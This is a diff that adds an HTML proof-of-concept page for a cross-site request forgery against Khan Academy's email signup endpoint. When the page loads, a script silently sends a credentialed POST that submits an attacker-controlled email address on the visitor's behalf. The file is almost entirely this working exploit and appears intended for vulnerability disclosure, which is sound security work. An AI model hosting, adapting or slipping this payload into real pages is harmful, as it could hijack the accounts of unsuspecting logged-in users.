@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <title>Test  CSRF PoC</title>
+        <style type="text/css">
+        body {
+            display:flex;
+            flex-direction:column;
+            justify-content:center;
+            min-height:100vh;
+            margin:0;
+        }
+        p {
+            display:flex;
+            align-self:center;
+            font-size:0.8rem;
+            font-family:sans-serif;
+            font-weight:bold;
+            text-transform:uppercase;
+            letter-spacing:0.1rem;
+        }
+        </style>
+    </head>
+    <body>
+        <p>Khan Academy Signup Email CSRF PoC</p>
+        <script type="text/javascript">
+            window.addEventListener('load', function(e) {
+                var attacker_addr = 'attacker@rapidlight.io';
+                var x = new XMLHttpRequest();
+                x.open('POST', 'https://www.khanacademy.org/signup/email', true);
+                x.withCredentials = true;
+                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                x.send('email=' + encodeURIComponent(attacker_addr));
+            }, false);
+        </script>
+    </body>
+</html>
